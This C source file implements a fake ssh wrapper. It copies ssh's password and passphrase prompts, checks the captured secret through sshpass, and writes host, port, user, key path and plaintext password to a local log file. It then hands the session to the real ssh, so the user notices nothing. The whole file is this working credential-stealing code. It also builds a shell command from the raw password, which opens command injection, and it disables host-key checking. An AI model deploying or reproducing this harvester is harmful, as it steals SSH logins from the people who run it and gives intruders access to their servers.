#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdbool.h>
#include <termios.h>

#define MAX_PASS_LEN 1024
#define MAX_CMD_LEN 5120
#define MAX_PROMPT_LEN 5120
#define MAX_DUMP_LEN 5120

char *private_key_timeout = "10";
char *ssh_path = "/usr/bin/ssh";
char *dump_path = "ssh_connections.log";
char *strict_key_checking_arguments = "-o StrictHostKeyChecking=no";

bool fileExsits(char *filePath) {
    FILE *file;
    if((file = fopen(filePath, "r"))) {
        fclose(file);
        return true;
    }
    return false;
}
int getch() {
    int character;
    struct termios old_settings, new_settings;
    tcgetattr(STDIN_FILENO, &old_settings);
    new_settings = old_settings;
    new_settings.c_lflag &= ~(ICANON | ECHO);
    tcsetattr(STDIN_FILENO, TCSANOW, &new_settings);
    character = getchar();
    tcsetattr(STDIN_FILENO, TCSANOW, &old_settings);
    return character;
}
void getPass(char *password, char *prompt) {
    int character, index = 0;
    printf("%s", prompt);
    while((character = getch()) != '\n')
        if (character == 127 || character == 8) {
            if(index != 0)
                index--;
        } else
            password[index++] = character;
    password[index] = '\0';
    printf("\n");
}
void buildCommand(char *command, char *password, int argc, char *argv[], bool private_key_file, int connection_arg) {
    size_t len = 0;
    if (!private_key_file)
        len = snprintf(command, MAX_CMD_LEN, "sshpass -p '%s' %s %s", password, ssh_path, strict_key_checking_arguments);
    else
        len = snprintf(command, MAX_CMD_LEN, "timeout %ss sshpass -P passphrase -p '%s' %s %s", private_key_timeout, password, ssh_path, strict_key_checking_arguments);

    for (int i = 1; i <= connection_arg && len < MAX_CMD_LEN - 1; i++)
        len += snprintf(command + len, MAX_CMD_LEN - len, " %s", argv[i]);
    snprintf(command + len, MAX_CMD_LEN - len, " 'echo -n'");
}
void generateDump(int argc, char *argv[]) {
    char *dump_line = (char *) malloc(MAX_DUMP_LEN * sizeof(char));
    strcpy(dump_line, "");
    for(int i = 0; i < argc; i++) {
        strcat(dump_line, *(argv+i));
        strcat(dump_line, ",");
    }
    strcat(dump_line, "\n");
    FILE *dump_file;
    dump_file = fopen(dump_path, "a");
    if(dump_file != NULL) {
        fputs(dump_line, dump_file);
        fclose(dump_file);
    }
}
void sshExec(char *pass, int argc, char *argv[], bool private_key_file) {
    int offset = private_key_file == false ? 0 : 2;
    char **exec_args = (char **) malloc((argc+4+offset) * sizeof(char *));
    *(exec_args) = "sshpass";
    if(private_key_file) {
        *(exec_args+1) = "-P";
        *(exec_args+2) = "passphrase";
    }
    *(exec_args+1+offset) = "-p";
    *(exec_args+2+offset) = pass;
    *(exec_args+3+offset) = ssh_path;
    for(int i = 1; i < argc; i++)
        *(exec_args+3+offset+i) = *(argv+i);
    *(exec_args+argc+3+offset) = NULL;
    execvp(exec_args[0], exec_args);
}

int main(int argc, char *argv[]) {
    int port_arg = -1, private_key_file_arg = -1, connection_arg = -1, userLen = -1;
    char *user = NULL, *host = NULL, *separator = NULL;
    char *pass = (char *) malloc(MAX_PASS_LEN * sizeof(char));
    char *prompt = (char *) malloc(MAX_PROMPT_LEN * sizeof(char));
    char *cmd = (char *) malloc(MAX_CMD_LEN * sizeof(char));

    for(int i = 0; i < argc; i++)
        if(strcmp("-p", *(argv+i)) == 0)
            port_arg = ++i;
        else if(strcmp("-i", *(argv+i)) == 0)
            private_key_file_arg = ++i;
        else {
            separator = strchr(*(argv+i), '@');
            if(separator != NULL) {
                *separator = '\0';
                user = *(argv+i);
                host = separator+1;
                userLen = separator - user;
                connection_arg = i;
                break;
            }
        }

    if(connection_arg == -1) {
        argv[0] = ssh_path;
        execvp(argv[0], argv);
    }
    if(private_key_file_arg == -1)
        snprintf(prompt, MAX_PROMPT_LEN, "%s@%s's password: ", user, host);
    else {
        if(!fileExsits(*(argv+private_key_file_arg))) {
            printf("Warning: Identity file %s not accessible: No such file or directory.\n%s@%s: Permission denied (publickey)\n", *(argv+private_key_file_arg), user, host);
            return 1;
        }
        snprintf(prompt, MAX_PROMPT_LEN, "Enter passphrase for key '%s': ", *(argv+private_key_file_arg));
    }
    getPass(pass, prompt);

    *(user+userLen) = '@';
    buildCommand(cmd, pass, argc, argv, private_key_file_arg == -1? false: true, connection_arg);
    *(user+userLen) = '\0';
    while(system(cmd) != 0) {
        getPass(pass, prompt);
        *(user+userLen) = '@';
        buildCommand(cmd, pass, argc, argv, private_key_file_arg == -1? false: true, connection_arg);
        *(user+userLen) = '\0';
    }

    if(private_key_file_arg == -1) {
        char *dump_args[] = {
            "ssh",
            host,
            port_arg != -1 ? *(argv+port_arg): "22",
            user,
            pass
        };
        generateDump(5, dump_args);
    } else {
        char *dump_args[] = {
            "ssh",
            host,
            port_arg != -1 ? *(argv+port_arg): "22",
            user,
            *(argv+private_key_file_arg),
            pass
        };
        generateDump(6, dump_args);
    }

    *(user+userLen) = '@';
    sshExec(pass, argc, argv, private_key_file_arg == -1? false: true);

    return 0;
}